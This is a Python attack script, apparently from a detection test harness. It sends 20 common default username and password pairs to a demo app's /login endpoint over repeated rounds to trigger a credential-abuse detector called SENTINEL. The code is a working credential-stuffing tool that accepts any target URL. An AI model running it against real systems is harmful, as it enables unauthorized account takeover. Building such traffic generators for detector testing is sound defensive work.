"""Credential stuffing attack against the demo app.

Tries common username/password combinations to test for weak
credentials. Generates real traffic the scanner pushes into SENTINEL,
triggering the credential abuse detector.

Usage: python -m attacks.credential_stuffing [--target http://demo-app:5000]
"""

from __future__ import annotations

import argparse
import time
from urllib import error, request

# Common credential pairs (username:password)
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("user", "password"),
    ("user", "user"),
    ("user", "123456"),
    ("test", "test"),
    ("test", "password"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("guest", "guest"),
    ("guest", "password"),
    ("support", "support"),
    ("support", "password"),
    ("info", "info"),
    ("info", "password"),
    ("user1", "password1"),
    ("user1", "123456"),
]


def run(target: str, delay: float = 0.2, rounds: int = 2) -> int:
    target = target.rstrip("/")
    total = len(CREDENTIALS) * rounds
    print(
        f"[credential-stuffing] attacking {target}/login with "
        f"{len(CREDENTIALS)} credential pairs x{rounds} rounds ({total} attempts)"
    )

    success_count = 0
    for round_idx in range(rounds):
        for username, password in CREDENTIALS:
            data = f"username={username}&password={password}".encode()
            req = request.Request(
                f"{target}/login",
                data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST",
            )
            try:
                resp = request.urlopen(req, timeout=5)
                code = resp.getcode()
                body = resp.read().decode(errors="replace")[:100]
                # Successful login redirects to /dashboard
                if code == 302 or "Welcome" in body:
                    success_count += 1
                    print(
                        f"  round {round_idx+1}  {username}:{password:15s}  "
                        f"status={code}  SUCCESS"
                    )
                else:
                    print(
                        f"  round {round_idx+1}  {username}:{password:15s}  "
                        f"status={code}"
                    )
            except error.HTTPError as e:
                code = e.code
                print(
                    f"  round {round_idx+1}  {username}:{password:15s}  "
                    f"status={code}"
                )
            except Exception:
                print(
                    f"  round {round_idx+1}  {username}:{password:15s}  "
                    f"status=error"
                )
            time.sleep(delay)

    print(
        f"[credential-stuffing] done: {total} attempts, "
        f"{success_count} successful logins"
    )
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:5000")
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--rounds", type=int, default=2)
    args = parser.parse_args()
    return run(args.target, delay=args.delay, rounds=args.rounds)


if __name__ == "__main__":
    raise SystemExit(main())
